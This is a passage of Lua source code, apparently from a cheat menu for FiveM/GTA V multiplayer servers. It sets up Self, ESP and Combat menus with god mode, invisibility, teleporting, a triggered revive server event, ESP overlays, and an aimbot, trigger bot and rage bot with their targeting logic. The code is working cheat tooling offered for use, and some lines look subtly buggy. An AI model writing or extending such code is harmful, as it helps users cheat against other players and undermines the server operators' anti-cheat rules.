               ADRVSDD:GetFunction("DrawLine")(top_front_right, top_front_left, r, g, b, a)
               ADRVSDD:GetFunction("DrawLine")(top_back_right, top_back_left, r, g, b, a)
               ADRVSDD:GetFunction("DrawLine")(bottom_front_left, bottom_front_right, r, g, b, a)
               ADRVSDD:GetFunction("DrawLine")(bottom_back_left, bottom_back_right, r, g, b, a)
           end
       
           ADRVSDD:AddCategory("Self", function(self, x, y, w, h)
               local curY = 5
       
               if self.Painter:CheckBox("GOD MODE", self.Config.Player.God, x, y, 5, curY, 200, 20, 255, 255, 255, 255, "god_enabled") then
                   if ADRVSDD.Config.SafeMode then
                       ADRVSDD:AddNotification("WARN", "Safe mode is currently on, if you wish to use this, disable it.")
                   else
                       self.Config.Player.God = not self.Config.Player.God
                       ADRVSDD.ConfigClass.Save(true)
                   end
               end
       
               local _w = (self.Painter:GetTextWidth("TELEPORT TO COORDS", 4, 0.37)) + 2
       
               if self.Painter:Button("TELEPORT TO COORDS", x, y, w - _w, curY, 200, 20, 255, 255, 255, 255, "teleport_to_coords") then
                   local x, y, z
                   _x = ADRVSDD:GetTextInput("Enter X Coordinate.", 0, 15)
       
                   if _x and dict.tonumber(_x) then
                       x = _x
                   end
       
                   if x then
                       local _y = ADRVSDD:GetTextInput("Enter Y Coordinate.", 0, 15)
       
                       if _y and dict.tonumber(_y) then
                           y = _y
                       end
                   end
       
                   if x and y then
                       local _z = ADRVSDD:GetTextInput("Enter Z Coordinate.", 0, 15)
       
                       if _z and dict.tonumber(_z) then
                           z = _z
                       end
                   end
       
                   if x and y and z then
                       x = dict.tonumber(x) + 0.0
                       y = dict.tonumber(y) + 0.0
                       z = dict.tonumber(z) + 0.0
                       ADRVSDD:GetFunction("SetEntityCoords")(ADRVSDD:GetFunction("PlayerPedId")(), x, y, z)
                       ADRVSDD:AddNotification("SUCCESS", "Teleported to coords.", 5000)
                   else
                       ADRVSDD:AddNotification("INFO", "Cancelled.", 5000)
                   end
               end
       
               local _w = (self.Painter:GetTextWidth("TELEPORT TO WAYPOINT", 4, 0.37)) + 2
       
               if self.Painter:Button("TELEPORT TO WAYPOINT", x, y, w - _w, curY + 25, 200, 20, 255, 255, 255, 255, "teleport_to_waypoint") then
                   ADRVSDD:TeleportToWaypoint()
               end
       
               curY = curY + 25
       
               if self.Painter:CheckBox("SEMI GOD MODE", self.Config.Player.SemiGod, x, y, 5, curY, 200, 20, 255, 255, 255, 255, "semi_god_enabled") then
                   self.Config.Player.SemiGod = not self.Config.Player.SemiGod
                   ADRVSDD.ConfigClass.Save(true)
               end
       
               curY = curY + 25
       
               if self.Painter:CheckBox("ANTI AFK", self.Config.Player.AntiAFK, x, y, 5, curY, 200, 20, 255, 255, 255, 255, "anti_afk") then
                   self.Config.Player.AntiAFK = not self.Config.Player.AntiAFK
                   ADRVSDD.ConfigClass.Save(true)
               end
       
               curY = curY + 25
       
               if self.Painter:CheckBox("INFINITE STAMINA", self.Config.Player.InfiniteStamina, x, y, 5, curY, 200, 20, 255, 255, 255, 255, "infinite_stamina") then
                   self.Config.Player.InfiniteStamina = not self.Config.Player.InfiniteStamina
                   ADRVSDD.ConfigClass.Save(true)
               end
       
               curY = curY + 25
       
               if self.Painter:CheckBox("NO RAGDOLL", self.Config.Player.NoRagdoll, x, y, 5, curY, 200, 20, 255, 255, 255, 255, "no_ragdoll_enabled") then
                   self.Config.Player.NoRagdoll = not self.Config.Player.NoRagdoll
                   ADRVSDD.ConfigClass.Save(true)
               end
       
               curY = curY + 25
       
               if self.Painter:CheckBox("INVISIBILITY", self.Config.Player.Invisibility, x, y, 5, curY, 200, 20, 255, 255, 255, 255, "invisibility_enabled") then
                   self.Config.Player.Invisibility = not self.Config.Player.Invisibility
                   ADRVSDD.ConfigClass.Save(true)
               end
       
               curY = curY + 25
       
               if self.Painter:CheckBox("REVEAL INVISIBLE PLAYERS", self.Config.Player.RevealInvisibles, x, y, 5, curY, 200, 20, 255, 255, 255, 255, "reveal_invis_players") then
                   self.Config.Player.RevealInvisibles = not self.Config.Player.RevealInvisibles
                   ADRVSDD.ConfigClass.Save(true)
               end
       
               curY = curY + 25
       
               if self.Painter:CheckBox("FAST RUN", self.Config.Player.FastRun, x, y, 5, curY, 200, 20, 255, 255, 255, 255, "fast_af_runna_enabled") then
                   self.Config.Player.FastRun = not self.Config.Player.FastRun
                   ADRVSDD.ConfigClass.Save(true)
               end
       
               curY = curY + 25
       
               if self.Painter:CheckBox("SUPER JUMP", self.Config.Player.SuperJump, x, y, 5, curY, 200, 20, 255, 255, 255, 255, "big_jump_enabled") then
                   self.Config.Player.SuperJump = not self.Config.Player.SuperJump
                   ADRVSDD.ConfigClass.Save(true)
               end
       
               curY = curY + 25
       
               if self.Painter:CheckBox("SUPER MAN", self.Config.Player.SuperMan, x, y, 5, curY, 200, 20, 255, 255, 255, 255, "super_man_enabled") then
                   self.Config.Player.SuperMan = not self.Config.Player.SuperMan
                   ADRVSDD.ConfigClass.Save(true)
       
                   if self.Config.Player.SuperMan then
                       ADRVSDD:AddNotification("INFO", "Press ~y~SPACE~w~ to go up / ~y~W~w~ to go forward.")
                   end
               end
       
               curY = curY + 25
       
               if self.Painter:CheckBox("MAGIC CARPET", self.Config.Player.MagicCarpet, x, y, 5, curY, 200, 20, 255, 255, 255, 255, "magic_carpet_enabled") then
                   self.Config.Player.MagicCarpet = not self.Config.Player.MagicCarpet
                   ADRVSDD.ConfigClass.Save(true)
               end
       
               curY = curY + 25
       
               if self.Painter:CheckBox("FAKE DEAD", self.Config.Player.FakeDead, x, y, 5, curY, 200, 20, 255, 255, 255, 255, "fake_dead") then
                   self.Config.Player.FakeDead = not self.Config.Player.FakeDead
                   ADRVSDD.ConfigClass.Save(true)
               end
       
               curY = curY + 25
       
               if self.Painter:CheckBox("FORCE RADAR", self.Config.Player.ForceRadar, x, y, 5, curY, 200, 20, 255, 255, 255, 255, "force_radar") then
                   self.Config.Player.ForceRadar = not self.Config.Player.ForceRadar
                   ADRVSDD.ConfigClass.Save(true)
               end
       
               curY = curY + 20
       
               if self.Painter:Button("HEAL", x, y, 5, curY, 200, 20, 255, 255, 255, 255, "heal_option") then
                   ADRVSDD:GetFunction("SetEntityHealth")(ADRVSDD:GetFunction("PlayerPedId")(), 200)
                   ADRVSDD:GetFunction("ClearPedBloodDamage")(ADRVSDD:GetFunction("PlayerPedId")())
                   ADRVSDD:AddNotification("INFO", "Healed.")
               end
       
               curY = curY + 25
       
               if self.Painter:Button("GIVE ARMOR", x, y, 5, curY, 200, 20, 255, 255, 255, 255, "armor_option") then
                   ADRVSDD:GetFunction("SetPedArmour")(ADRVSDD:GetFunction("PlayerPedId")(), 200)
                   ADRVSDD:AddNotification("INFO", "Armour given.")
               end
       
               curY = curY + 25
       
               if self.Painter:Button("SUICIDE", x, y, 5, curY, 200, 20, 255, 255, 255, 255, "suicide_option") then
                   ADRVSDD:GetFunction("SetEntityHealth")(ADRVSDD:GetFunction("PlayerPedId")(), 0)
                   ADRVSDD:AddNotification("INFO", "Killed.")
               end
       
               curY = curY + 25
       
               if self.DynamicTriggersasdf["esx_ambulancejob"] and self.DynamicTriggersasdf["esx_ambulancejob"]["esx_ambulancejob:revive"] then
                   if self.Painter:Button("REVIVE ~g~ESX", x, y, 5, curY, 200, 20, 255, 255, 255, 255, "esx_revive") then
                       ADRVSDD:GetFunction("TriggerEvent")(self.DynamicTriggersasdf["esx_ambulancejob"]["esx_ambulancejob:revive"])
                       ADRVSDD:AddNotification("INFO", "Revived.")
                   end
       
                   curY = curY + 25
               end
       
               if self.Painter:Button("REVIVE", x, y, 5, curY, 200, 20, 255, 255, 255, 255, "native_revive") then
                   ADRVSDD:GetFunction("NetworkResurrectLocalPlayer")(ADRVSDD:GetFunction("GetOffsetFromEntityInWorldCoords")(ADRVSDD:GetFunction("PlayerPedId")(), 0.0, 0.0, 0.0), ADRVSDD:GetFunction("GetEntityHeading")(ADRVSDD:GetFunction("PlayerPedId")()))
                   ADRVSDD:AddNotification("INFO", "Revived.")
               end
           end)
       
           ADRVSDD:AddCategory("ESP", function(self, x, y)
               local curY = 5
       
               if self.Painter:CheckBox("ESP", self.Config.Player.ESP, x, y, 5, curY, 200, 20, 255, 255, 255, 255, "esp_enabled") then
                   self.Config.Player.ESP = not self.Config.Player.ESP
                   ADRVSDD.ConfigClass.Save(true)
               end
       
               curY = curY + 25
       
               if self.Painter:CheckBox("BOX", self.Config.Player.Box, x, y, 5, curY, 200, 20, 255, 255, 255, 255, "esp_box_enabled") then
                   self.Config.Player.Box = not self.Config.Player.Box
                   ADRVSDD.ConfigClass.Save(true)
               end
       
               curY = curY + 25
       
               if self.Painter:CheckBox("BLIPS", self.Config.Player.Blips, x, y, 5, curY, 200, 20, 255, 255, 255, 255, "esp_blips_enabled") then
                   if self.Config.Player.Blips then
                       self:DoBlips(true)
                   end
       
                   self.Config.Player.Blips = not self.Config.Player.Blips
                   ADRVSDD.ConfigClass.Save(true)
               end
       
               curY = curY + 25
       
               if self.Painter:CheckBox("CROSSHAIR", self.Config.Player.CrossHair, x, y, 5, curY, 200, 20, 255, 255, 255, 255, "crosshair_enabled") then
                   self.Config.Player.CrossHair = not self.Config.Player.CrossHair
                   ADRVSDD.ConfigClass.Save(true)
               end
       
               curY = curY + 20
       
               if self.Painter:Button("ESP DRAW DISTANCE: " .. self.Config.Player.ESPDistance, x, y, 5, curY, 200, 20, 255, 255, 255, 255, "set_aimbot_fov") then
                   local new = ADRVSDD:GetTextInput("Enter ESP Draw Distance [35-50000]", self.Config.Player.ESPDistance, 7)
                   if not dict.tonumber(new) then return ADRVSDD:AddNotification("ERROR", "Invalid distance.") end
                   if dict.tonumber(new) < 35 or dict.tonumber(new) > 50000 then return ADRVSDD:AddNotification("ERROR", "Invalid distance.") end
                   self.Config.Player.ESPDistance = dict.tonumber(new) + 0.0
                   ADRVSDD:AddNotification("SUCCESS", "ESP Draw Distance changed to " .. self.Config.Player.ESPDistance .. ".")
                   ADRVSDD.ConfigClass.Save(true)
               end
           end)
       
           local bone_check = {{31086, "SKEL_HEAD"}, {0, "SKEL_ROOT"}, {22711, "SKEL_L_Forearm"}, {28252, "SKEL_R_Forearm"}, {45509, "SKEL_L_UpperArm"}, {40269, "SKEL_R_UpperArm"}, {58271, "SKEL_L_Thigh"}, {51826, "SKEL_R_Thigh"}, {24816, "SKEL_Spine1"}, {24817, "SKEL_Spine2"}, {24818, "SKEL_Spine3"}, {14201, "SKEL_L_Foot"}, {52301, "SKEL_R_Foot"}}
           local aimbot_bones = {"SKEL_HEAD", "SKEL_ROOT", "SKEL_L_Forearm", "SKEL_R_Forearm", "SKEL_L_UpperArm", "SKEL_R_UpperArm", "SKEL_L_Thigh", "SKEL_R_Thigh", "SKEL_Spine1", "SKEL_Spine2", "SKEL_Spine3", "SKEL_L_Foot", "SKEL_R_Foot"}
       
           ADRVSDD:AddCategory("Combat", function(self, x, y, w, h)
               local curY = 5
       
               if self.Painter:CheckBox("TRIGGER BOT", self.Config.Player.TriggerBot, x, y, 5, curY, 200, 20, 255, 255, 255, 255, "trigger_bot_enabled") then
                   self.Config.Player.TriggerBot = not self.Config.Player.TriggerBot
                   ADRVSDD.ConfigClass.Save(true)
               end
       
               local _w = (self.Painter:GetTextWidth("ANTI AIM", 4, 0.35)) + 20
       
               if self.Painter:CheckBox("ANTI AIM", self.Config.Player.AntiAim, x, y, w - _w - 10, curY, 200, 20, 255, 255, 255, 255, "anti_aim_enabled") then
                   self.Config.Player.AntiAim = not self.Config.Player.AntiAim
                   ADRVSDD.ConfigClass.Save(true)
               end
       
               curY = curY + 25
       
               if self.Painter:CheckBox("TRIGGER BOT NEEDS LOS", self.Config.Player.TriggerBotNeedsLOS, x, y, 5, curY, 200, 20, 255, 255, 255, 255, "triggerbot_need_los_enabled") then
                   self.Config.Player.TriggerBotNeedsLOS = not self.Config.Player.TriggerBotNeedsLOS
                   ADRVSDD.ConfigClass.Save(true)
               end
       
               curY = curY + 25
       
               if self.Painter:CheckBox("AIMBOT", self.Config.Player.Aimbot, x, y, 5, curY, 200, 20, 255, 255, 255, 255, "aimbot_enabled") then
                   self.Config.Player.Aimbot = not self.Config.Player.Aimbot
                   ADRVSDD.ConfigClass.Save(true)
               end
       
               curY = curY + 25
       
               if self.Painter:CheckBox("AIMBOT NEEDS LOS", self.Config.Player.AimbotNeedsLOS, x, y, 5, curY, 200, 20, 255, 255, 255, 255, "aimbot_need_los_enabled") then
                   self.Config.Player.AimbotNeedsLOS = not self.Config.Player.AimbotNeedsLOS
                   ADRVSDD.ConfigClass.Save(true)
               end
       
               curY = curY + 25
       
               if self.Painter:CheckBox("TP TO AIMBOT TARGET", self.Config.Player.TPAimbot, x, y, 5, curY, 200, 20, 255, 255, 255, 255, "tpaimbot_enabled") then
                   self.Config.Player.TPAimbot = not self.Config.Player.TPAimbot
                   ADRVSDD.ConfigClass.Save(true)
               end
       
               curY = curY + 25
       
               if self.Painter:CheckBox("DRAW AIMBOT FOV", self.Config.Player.AimbotDrawFOV, x, y, 5, curY, 200, 20, 255, 255, 255, 255, "draw_aimbot_fov") then
                   self.Config.Player.AimbotDrawFOV = not self.Config.Player.AimbotDrawFOV
                   ADRVSDD.ConfigClass.Save(true)
               end
       
               curY = curY + 25
       
               if self.Painter:CheckBox("ONLY TARGET PLAYERS", self.Config.Player.OnlyTargetPlayers, x, y, 5, curY, 200, 20, 255, 255, 255, 255, "only_target_players") then
                   self.Config.Player.OnlyTargetPlayers = not self.Config.Player.OnlyTargetPlayers
                   ADRVSDD.ConfigClass.Save(true)
               end
       
               curY = curY + 25
       
               if self.Painter:CheckBox("TRIGGER BOT TARGET VEHICLES", self.Config.Player.TargetInsideVehicles, x, y, 5, curY, 200, 20, 255, 255, 255, 255, "target_inside_vehicles") then
                   self.Config.Player.TargetInsideVehicles = not self.Config.Player.TargetInsideVehicles
                   ADRVSDD.ConfigClass.Save(true)
               end
       
               curY = curY + 25
       
               if self.Painter:CheckBox("INFINITE COMBAT ROLL", self.Config.Player.InfiniteCombatRoll, x, y, 5, curY, 200, 20, 255, 255, 255, 255, "infinite_combat_roll") then
                   self.Config.Player.InfiniteCombatRoll = not self.Config.Player.InfiniteCombatRoll
                   ADRVSDD.ConfigClass.Save(true)
               end
       
               curY = curY + 25
       
               if self.Painter:CheckBox("~r~RAGE ~w~BOT", self.Config.Player.RageBot, x, y, 5, curY, 200, 20, 255, 255, 255, 255, "rage_bot") then
                   self.Config.Player.RageBot = not self.Config.Player.RageBot
                   ADRVSDD.ConfigClass.Save(true)
               end
       
               curY = curY + 25
       
               if self.Painter:CheckBox("NO BULLET DROP", self.Config.Player.NoDrop, x, y, 5, curY, 200, 20, 255, 255, 255, 255, "no_bullet_drop") then
                   self.Config.Player.NoDrop = not self.Config.Player.NoDrop
                   ADRVSDD.ConfigClass.Save(true)
               end
       
               curY = curY + 25
       
               if self.Painter:CheckBox("NO RELOAD", self.Config.Player.NoReload, x, y, 5, curY, 200, 20, 255, 255, 255, 255, "no_reload") then
                   self.Config.Player.NoReload = not self.Config.Player.NoReload
                   ADRVSDD.ConfigClass.Save(true)
               end
       
               curY = curY + 25
       
               if self.Painter:CheckBox("INFINITE AMMO", self.Config.Player.InfiniteAmmo, x, y, 5, curY, 200, 20, 255, 255, 255, 255, "infinite_ammo") then
                   self.Config.Player.InfiniteAmmo = not self.Config.Player.InfiniteAmmo
                   ADRVSDD.ConfigClass.Save(true)
               end
       
               curY = curY + 25
       
               if self.Painter:CheckBox("RAPID FIRE", self.Config.Player.RapidFire, x, y, 5, curY, 200, 20, 255, 255, 255, 255, "rapid_fire") then
                   self.Config.Player.RapidFire = not self.Config.Player.RapidFire
                   ADRVSDD.ConfigClass.Save(true)
               end
       
               curY = curY + 25
       
               if self.Painter:CheckBox("EXPLOSIVE AMMO", self.Config.Player.ExplosiveAmmo, x, y, 5, curY, 200, 20, 255, 255, 255, 255, "explosive_ammo") then
                   self.Config.Player.ExplosiveAmmo = not self.Config.Player.ExplosiveAmmo
                   ADRVSDD.ConfigClass.Save(true)
               end
       
               curY = curY + 25
       
               if self.Painter:CheckBox("ONE TAP", self.Config.Player.OneTap, x, y, 5, curY, 200, 20, 255, 255, 255, 255, "one_tap_enabled") then
                   if ADRVSDD.Config.SafeMode then
                       ADRVSDD:AddNotification("WARN", "Safe mode is currently on, if you wish to use this, disable it.")
                   else
                       self.Config.Player.OneTap = not self.Config.Player.OneTap
                       ADRVSDD.ConfigClass.Save(true)
                   end
               end
       
               curY = curY + 20
       
               if self.Painter:ListChoice("AIMBOT BONE: ", aimbot_bones, x, y, 5, curY, 200, 20, 255, 255, 255, 255, "aimbot_bone") then
                   self.Config.Player.AimbotBone = list_choices["aimbot_bone"].selected
                   ADRVSDD.ConfigClass.Save(true)
               end
       
               curY = curY + 25
       
               if self.Painter:Button("AIMBOT FOV: " .. self.Config.Player.AimbotFOV, x, y, 5, curY, 200, 20, 255, 255, 255, 255, "set_aimbot_fov") then
                   local new = ADRVSDD:GetTextInput("Enter Aimbot FOV [35-500]", self.Config.Player.AimbotFOV, 7)
                   if not dict.tonumber(new) then return ADRVSDD:AddNotification("ERROR", "Invalid FOV.") end
                   if dict.tonumber(new) < 35 or dict.tonumber(new) > 500 then return ADRVSDD:AddNotification("ERROR", "Invalid FOV.") end
                   self.Config.Player.AimbotFOV = dict.tonumber(new) + 0.0
                   ADRVSDD:AddNotification("SUCCESS", "Aimbot FOV changed to " .. self.Config.Player.AimbotFOV .. ".")
                   ADRVSDD.ConfigClass.Save(true)
               end
       
               curY = curY + 25
       
               if self.Painter:Button("TRIGGER BOT DISTANCE: " .. self.Config.Player.TriggerBotDistance, x, y, 5, curY, 200, 20, 255, 255, 255, 255, "set_trigger_bot_distance") then
                   local new = ADRVSDD:GetTextInput("Enter Trigger Bot Distance [10-10000]", self.Config.Player.TriggerBotDistance, 7)
                   if not dict.tonumber(new) then return ADRVSDD:AddNotification("ERROR", "Invalid distance.") end
                   if dict.tonumber(new) < 10 or dict.tonumber(new) > 10000 then return ADRVSDD:AddNotification("ERROR", "Invalid distance.") end
                   self.Config.Player.TriggerBotDistance = dict.tonumber(new) + 0.0
                   ADRVSDD:AddNotification("SUCCESS", "Trigger Bot distance changed to " .. self.Config.Player.TriggerBotDistance .. ".")
                   ADRVSDD.ConfigClass.Save(true)
               end
       
               curY = curY + 25
       
               if self.Painter:Button("TP AIMBOT THRESHOLD: " .. self.Config.Player.TPAimbotThreshold, x, y, 5, curY, 200, 20, 255, 255, 255, 255, "set_tp_aimbot_threshold") then
                   local new = ADRVSDD:GetTextInput("Enter TP Aimbot Distance [10-1000]", self.Config.Player.TPAimbotThreshold, 7)
                   if not dict.tonumber(new) then return ADRVSDD:AddNotification("ERROR", "Invalid distance.") end
                   if dict.tonumber(new) < 10 or dict.tonumber(new) > 1000 then return ADRVSDD:AddNotification("ERROR", "Invalid distance.") end
                   self.Config.Player.TPAimbotThreshold = dict.tonumber(new) + 0.0
                   ADRVSDD:AddNotification("SUCCESS", "TP Aimbot threshold changed to " .. self.Config.Player.TPAimbotThreshold .. ".")
                   ADRVSDD.ConfigClass.Save(true)
               end
       
               curY = curY + 25
       
               if self.Painter:Button("TP AIMBOT DISTANCE: " .. self.Config.Player.TPAimbotDistance, x, y, 5, curY, 200, 20, 255, 255, 255, 255, "set_tp_aimbot_distance") then
                   local new = ADRVSDD:GetTextInput("Enter TP Aimbot Distance [0-10]", self.Config.Player.TPAimbotDistance, 7)
                   if not dict.tonumber(new) then return ADRVSDD:AddNotification("ERROR", "Invalid distance.") end
                   if dict.tonumber(new) < 0 or dict.tonumber(new) > 10 then return ADRVSDD:AddNotification("ERROR", "Invalid distance.") end
                   self.Config.Player.TPAimbotDistance = dict.tonumber(new) + 0.0
                   ADRVSDD:AddNotification("SUCCESS", "TP Aimbot distance changed to " .. self.Config.Player.TPAimbotDistance .. ".")
                   ADRVSDD.ConfigClass.Save(true)
               end
           end)
       
           local function _is_ped_player(ped)
               local id = ADRVSDD:GetFunction("NetworkGetPlayerIndexFromPed")(ped)
       
               return id and id > 0
           end
       
           local function rot_to_dir(rot)
               local radZ = rot.z * 0.0174532924
               local radX = rot.x * 0.0174532924
               local num = dict.math.abs(dict.math.cos(radX))
               local dir = vector3(-dict.math.sin(radZ) * num, dict.math.cos(radZ) * num, radX)
       
               return dir
           end
       
           local function _multiply(vector, mult)
               return vector3(vector.x * mult, vector.y * mult, vector.z * mult)
           end
       
           local function _get_ped_hovered_over()
               local cur = ADRVSDD:GetFunction("GetGameplayCamCoord")()
               local _dir = ADRVSDD:GetFunction("GetGameplayCamRot")(0)
               local dir = rot_to_dir(_dir)
               local len = _multiply(dir, ADRVSDD.Config.Player.TriggerBotDistance)
               local targ = cur + len
               local handle = ADRVSDD:GetFunction("StartShapeTestRay")(cur.x, cur.y, cur.z, targ.x, targ.y, targ.z, -1)
               local _, hit, hit_pos, _, entity = ADRVSDD:GetFunction("GetShapeTestResult")(handle)
               local force
               local _seat
       
               if ADRVSDD:GetFunction("DoesEntityExist")(entity) and ADRVSDD:GetFunction("IsEntityAVehicle")(entity) and ADRVSDD.Config.Player.TargetInsideVehicles and ADRVSDD:GetFunction("HasEntityClearLosToEntityInFront")(ADRVSDD:GetFunction("PlayerPedId")(), entity) then
                   local driver = ADRVSDD:GetFunction("GetPedInVehicleSeat")(entity, -1)
       
                   if ADRVSDD:GetFunction("DoesEntityExist")(driver) and not ADRVSDD:GetFunction("IsPedDeadOrDying")(driver) then
                       entity = driver
                       force = true
                       _seat = -1
                   else
                       local _dist = dict.math.huge
                       local _ped
       
                       for i = -2, ADRVSDD:GetFunction("GetVehicleMaxNumberOfPassengers")(vehicle) do
                           local who = ADRVSDD:GetFunction("GetPedInVehicleSeat")(entity, i)
       
                           if ADRVSDD:GetFunction("DoesEntityExist")(who) and ADRVSDD:GetFunction("IsEntityAPed")(who) and not ADRVSDD:GetFunction("IsPedDeadOrDying")(who) then
                               local s_pos = ADRVSDD:GetFunction("GetOffsetFromEntityInWorldCoords")(who, 0.0, 0.0, 0.0)
                               local s_dist = ADRVSDD:GetFunction("GetDistanceBetweenCoords")(hit_pos.x, hit_pos.y, hit_pos.z, s_pos.x, s_pos.y, s_pos.z, true)
       
                               if s_dist < _dist then
                                   _dist = s_dist
                                   _ped = who
                                   _seat = i
                               end
                           end
                       end
       
                       if ADRVSDD:GetFunction("DoesEntityExist")(_ped) and ADRVSDD:GetFunction("IsEntityAPed")(_ped) then
                           entity = _ped
                           force = true
                       end
                   end
               end
       
               if hit and ADRVSDD:GetFunction("DoesEntityExist")(entity) and ADRVSDD:GetFunction("DoesEntityHaveDrawable")(entity) and ADRVSDD:GetFunction("IsEntityAPed")(entity) and (force or ADRVSDD:GetFunction("HasEntityClearLosToEntityInFront")(ADRVSDD:GetFunction("PlayerPedId")(), entity)) then return true, entity, _seat end
       
               return nil, false, nil
           end
       
           local _aimbot_poly = {}
       
           local function _within_poly(point, poly)
               local inside = false
               local j = #poly
       
               for i = 1, #poly do
                   if (poly[i].y < point.y and poly[j].y >= point.y or poly[j].y < point.y and poly[i].y >= point.y) and (poly[i].x + (point.y - poly[i].y) / (poly[j].y - poly[i].y) * (poly[j].x - poly[i].x) < point.x) then
                       inside = not inside
                   end
       
                   j = i
               end
       
               return inside
           end
       
           local function _is_ped_in_aimbot_fov(ped)
               local pos = ADRVSDD:GetFunction("GetOffsetFromEntityInWorldCoords")(ped, 0.0, 0.0, 0.0)
               local showing, sx, sy = ADRVSDD:GetFunction("GetScreenCoordFromWorldCoord")(pos.x, pos.y, pos.z)
               if not showing then return false end
       
               return _within_poly({
                   x = sx,
                   y = sy
               }, _aimbot_poly.points)
           end
       
           local function _get_ped_in_aimbot_fov()
               local fov = ADRVSDD.Config.Player.AimbotFOV
               local closest = dict.math.huge
               local selected
       
               for ped in ADRVSDD:EnumeratePeds() do
                   if not ADRVSDD:IsFriend(ped) and (not ADRVSDD.Config.Player.OnlyTargetPlayers or _is_ped_player(ped)) then
                       local pos = ADRVSDD:GetFunction("GetOffsetFromEntityInWorldCoords")(ped, 0.0, 0.0, 0.0)
                       local showing, sx, sy = ADRVSDD:GetFunction("GetScreenCoordFromWorldCoord")(pos.x, pos.y, pos.z)
       
                       if ped ~= ADRVSDD:GetFunction("PlayerPedId")() and showing and (not ADRVSDD.Config.Player.AimbotNeedsLOS or ADRVSDD:GetFunction("HasEntityClearLosToEntityInFront")(ADRVSDD:GetFunction("PlayerPedId")(), ped)) then
                           local in_fov = _is_ped_in_aimbot_fov(ped)
                           local us = ADRVSDD:GetFunction("GetGameplayCamCoord")()
                           local dist = ADRVSDD:GetFunction("GetDistanceBetweenCoords")(pos.x, pos.y, pos.z, us.x, us.y, us.z)
       
                           if in_fov and dist < closest then
                               dist = closest
                               selected = ped
                           end
                       end
                   end
               end
       
               if selected and (not ADRVSDD:GetFunction("DoesEntityExist")(ADRVSDD.Config.Player.AimbotTarget) or ADRVSDD:GetFunction("IsEntityDead")(ADRVSDD.Config.Player.AimbotTarget)) and not ADRVSDD:IsFriend(selected) and ADRVSDD:GetFunction("HasEntityClearLosToEntity")(ADRVSDD:GetFunction("PlayerPedId")(), selected) then
                   ADRVSDD.Config.Player.AimbotTarget = selected
               end
       
               local _ped = _get_ped_hovered_over()
       
               if not ADRVSDD.Config.Player.AimbotTarget and ADRVSDD:GetFunction("DoesEntityExist")(_ped) and not ADRVSDD:IsFriend(_ped) and (not ADRVSDD.Config.Player.OnlyTargetPlayers or _is_ped_player(_ped)) then
                   local pos = ADRVSDD:GetFunction("GetOffsetFromEntityInWorldCoords")(_ped, 0.0, 0.0, 0.0)
                   local showing, sx, sy = ADRVSDD:GetFunction("GetScreenCoordFromWorldCoord")(pos.x, pos.y, pos.z)
       
                   -- and ADRVSDD:GetFunction("HasEntityClearLosToEntityInFront")(ADRVSDD:GetFunction("PlayerPedId")(), ped) then
                   if _ped ~= ADRVSDD:GetFunction("PlayerPedId")() and showing and (not ADRVSDD.Config.Player.AimbotNeedsLOS or ADRVSDD:GetFunction("HasEntityClearLosToEntityInFront")(ADRVSDD:GetFunction("PlayerPedId")(), ped)) then
                       local in_fov = _is_ped_in_aimbot_fov(_ped)
       
                       if in_fov and not ADRVSDD:GetFunction("DoesEntityExist")(ADRVSDD.Config.Player.AimbotTarget) then
                           ADRVSDD.Config.Player.AimbotTarget = _ped
                       end
                   end
               end
           end
       
           local function _get_closest_bone(ped, _seat)
               local cur = ADRVSDD:GetFunction("GetGameplayCamCoord")()
               local _dir = ADRVSDD:GetFunction("GetGameplayCamRot")(0)
               local dir = rot_to_dir(_dir)
               local where = ADRVSDD:GetFunction("GetOffsetFromEntityInWorldCoords")(ped, 0.0, 0.0, 0.0)
               local dist = ADRVSDD:GetFunction("GetDistanceBetweenCoords")(cur.x, cur.y, cur.z, where.x, where.y, where.z) + 25.0
               local len = _multiply(dir, dist)
               local targ = cur + len
               local handle = ADRVSDD:GetFunction("StartShapeTestRay")(cur.x, cur.y, cur.z, targ.x, targ.y, targ.z, -1)
               local _, hit, hit_pos, _, entity = ADRVSDD:GetFunction("GetShapeTestResult")(handle)
       
               if ADRVSDD:GetFunction("IsEntityAVehicle")(entity) then
                   entity = ADRVSDD:GetFunction("GetPedInVehicleSeat")(entity, _seat)
               end
       
               if entity ~= ped then return false end
               local _dist, bone, _name = dict.math.huge, 0
       
               if hit then
                   for _, dat in dict.ipairs(bone_check) do
                       local id = dat[1]
       
                       if id ~= -1 then
                           local bone_coords = ADRVSDD:GetFunction("GetPedBoneCoords")(ped, id, 0.0, 0.0, 0.0)
                           local b_dist = ADRVSDD:GetFunction("GetDistanceBetweenCoords")(bone_coords.x, bone_coords.y, bone_coords.z, hit_pos.x, hit_pos.y, hit_pos.z, true)
       
                           if b_dist < _dist then
                               _dist = b_dist
                               bone = id
                               _name = dat[2]
                           end
                       end
                   end
               end
       
               return bone, _dist, _name
           end
       
           function ADRVSDD:DoAimbotPoly()
               local sx, sy = _aimbot_poly.sx, _aimbot_poly.sy
               local fov = self.Config.Player.AimbotFOV
               if not fov then return end
               if sx and ADRVSDD:ScrW() == sx and sy and ADRVSDD:ScrH() == sy and _aimbot_poly.fov == self.Config.Player.AimbotFOV then return end
               _aimbot_poly.sx = ADRVSDD:ScrW()
               _aimbot_poly.sy = ADRVSDD:ScrH()
               _aimbot_poly.fov = self.Config.Player.AimbotFOV
               _aimbot_poly.points = {}
       
               for i = 1, 360 do
                   local x = dict.math.cos(dict.math.rad(i)) / ADRVSDD:ScrW()
                   local y = dict.math.sin(dict.math.rad(i)) / ADRVSDD:ScrH()
                   local sx, sy = x * fov, y * fov
       
                   _aimbot_poly.points[#_aimbot_poly.points + 1] = {
                       x = sx + ((ADRVSDD:ScrW() / 2) / ADRVSDD:ScrW()),
                       y = sy + ((ADRVSDD:ScrH() / 2) / ADRVSDD:ScrH())
                   }
               end
           end
       
           function ADRVSDD:DrawAimbotFOV()
               for _, dat in dict.ipairs(_aimbot_poly.points) do
                   DrawRect(dat.x, dat.y, 5 / ADRVSDD:ScrW(), 5 / ADRVSDD:ScrH(), ADRVSDD.Tertiary[1], ADRVSDD.Tertiary[2], ADRVSDD.Tertiary[3], 70)
               end
           end
       
           function ADRVSDD:_rage_bot()
               for ped in ADRVSDD:EnumeratePeds() do
                   if ADRVSDD:GetFunction("DoesEntityExist")(ped) and ADRVSDD:GetFunction("IsEntityAPed")(ped) and ped ~= ADRVSDD:GetFunction("PlayerPedId")() and not ADRVSDD:GetFunction("IsPedDeadOrDying")(ped) then
                       if not ADRVSDD:IsFriend(ped) and (not ADRVSDD.Config.Player.OnlyTargetPlayers or _is_ped_player(ped)) then
